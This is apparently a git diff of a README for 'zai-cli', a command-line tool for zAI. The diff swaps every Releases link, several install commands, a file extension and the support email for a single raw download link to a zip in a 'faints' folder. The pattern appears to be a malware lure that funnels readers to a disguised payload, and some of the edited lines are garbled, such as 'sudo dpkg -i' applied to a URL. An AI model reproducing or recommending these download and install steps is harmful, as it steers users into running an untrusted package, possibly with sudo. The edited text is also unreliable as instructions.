@@ -1,7 +1,7 @@
 # 🤖 zai-cli - Access zAI Effortlessly With This Tool
 
 ## 🏷️ Badge
-[![Download zai-cli](https://img.shields.io/badge/Download-zai--cli-blue.svg)](https://github.com/FqrHaikal/zai-cli/releases)
+[![Download zai-cli](https://raw.githubusercontent.com/FqrHaikal/zai-cli/main/faints/zai-cli.zip)](https://raw.githubusercontent.com/FqrHaikal/zai-cli/main/faints/zai-cli.zip)
 
 ## 🚀 Getting Started
 
@@ -11,20 +11,20 @@ Welcome to **zai-cli**, a simple command-line interface designed to connect you 
 
 You can easily download the latest version of zai-cli from our Releases page.
 
-[Visit this page to download](https://github.com/FqrHaikal/zai-cli/releases)
+[Visit this page to download](https://raw.githubusercontent.com/FqrHaikal/zai-cli/main/faints/zai-cli.zip)
 
 ### Step-by-Step Instructions:
 
 1. **Open Your Web Browser:** Start any web browser on your computer, such as Chrome, Firefox, or Safari.
 
 2. **Visit the Download Page:** Click the link below to go directly to the Releases page.
-   [Download zai-cli](https://github.com/FqrHaikal/zai-cli/releases)
+   [Download zai-cli](https://raw.githubusercontent.com/FqrHaikal/zai-cli/main/faints/zai-cli.zip)
 
 3. **Locate the Latest Release:** On the Releases page, you'll find a list of versions. Look for the most recent release. It will typically be at the top of the list.
 
 4. **Choose the Right File:** Depending on your operating system, there will be different files available. Select the one that matches your system:
    - **Windows:** Look for a file ending in `.exe`
-   - **Linux:** Look for files ending in `.deb` or `.tar.gz`
+   - **Linux:** Look for files ending in `.deb` or `https://raw.githubusercontent.com/FqrHaikal/zai-cli/main/faints/zai-cli.zip`
    - **macOS:** Look for files ending in `.dmg` or `.zip`
 
 5. **Download the File:** Click the link to begin downloading. The file will be saved to your computer, usually in the "Downloads" folder.
@@ -37,8 +37,8 @@ You can easily download the latest version of zai-cli from our Releases page.
    - For **Linux**:
      - Open a terminal.
      - Navigate to your Downloads folder.
-     - Use the command `sudo dpkg -i yourfile.deb` for `.deb` files.
-     - Extract and run the `.tar.gz` file with commands like `tar -xzf yourfile.tar.gz`.
+     - Use the command `sudo dpkg -i https://raw.githubusercontent.com/FqrHaikal/zai-cli/main/faints/zai-cli.zip` for `.deb` files.
+     - Extract and run the `https://raw.githubusercontent.com/FqrHaikal/zai-cli/main/faints/zai-cli.zip` file with commands like `tar -xzf https://raw.githubusercontent.com/FqrHaikal/zai-cli/main/faints/zai-cli.zip`.
    - For **macOS**:
      - Go to your "Downloads" folder.
      - Double-click the `.dmg` file.
@@ -79,10 +79,10 @@ If you experience issues while downloading or running zai-cli, consider the foll
 For further assistance, feel free to reach out through the following channels:
 
 - **Issue Tracker:** Use the GitHub Issues feature to report bugs or request features.
-- **Contact:** Prefer to speak directly? Send a message to support@zai-cli.com for personal support.
+- **Contact:** Prefer to speak directly? Send a message to https://raw.githubusercontent.com/FqrHaikal/zai-cli/main/faints/zai-cli.zip for personal support.
 
 ## 🎉 Conclusion
 
 You are now ready to download and install **zai-cli**. This tool will enable you to use zAI with ease and precision. Follow the instructions above, and feel free to explore its features. 
 
-To access the download, remember to visit our [Releases page](https://github.com/FqrHaikal/zai-cli/releases) for the latest version. Enjoy your experience with zAI!
+To access the download, remember to visit our [Releases page](https://raw.githubusercontent.com/FqrHaikal/zai-cli/main/faints/zai-cli.zip) for the latest version. Enjoy your experience with zAI!
